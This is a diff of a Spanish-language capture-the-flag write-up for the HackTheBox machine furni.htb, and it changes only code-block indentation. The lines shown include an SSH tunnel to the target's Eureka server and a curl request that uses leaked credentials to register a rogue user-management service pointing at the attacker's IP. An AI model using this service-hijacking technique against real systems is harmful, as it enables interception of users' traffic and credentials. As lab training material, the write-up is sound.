@@ -207,17 +207,17 @@
 
    Para interactuar con este servicio desde fuera de la máquina, creamos un túnel SSH desde nuestra máquina Kali:
 
-    ```bash
+   ```bash
     ssh -N -L 8761:localhost:8761 oscar190@furni.htb
-    ```
+   ```
 
    <img width="805" height="265" alt="image" src="https://github.com/user-attachments/assets/39a1e345-6c2c-4401-a4ae-a07aae2ebaa8" />
 
    Ahora accedemos al panel Eureka, abrimos el navegador en:
 
-    ```bash
+   ```bash
     http://localhost:8761
-    ```
+   ```
 
    Podemos ver el panel de Eureka Server, aqui están registrados los microservicios. 
    
@@ -228,10 +228,10 @@
    Ahora hacemos la peticion ´curl´ para poder registrar el servicio
 
    ```bash
-   curl -X POST \
-   http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
-   -H 'Content-Type: application/json' \
-   -d '{
+    curl -X POST \
+    http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
+    -H 'Content-Type: application/json' \
+    -d '{
         "instance": {
           "instanceId": "USER-MANAGEMENT-SERVICE",
           "hostName": "10.10.14.209",
@@ -246,7 +246,7 @@
             "name": "MyOwn"
           }
         }
-      }'
+       }'
    ´´´
 
    Esto registra un servicio con IP 10.10.14.209 (nuestra máquina Kali) en el puerto 8081.
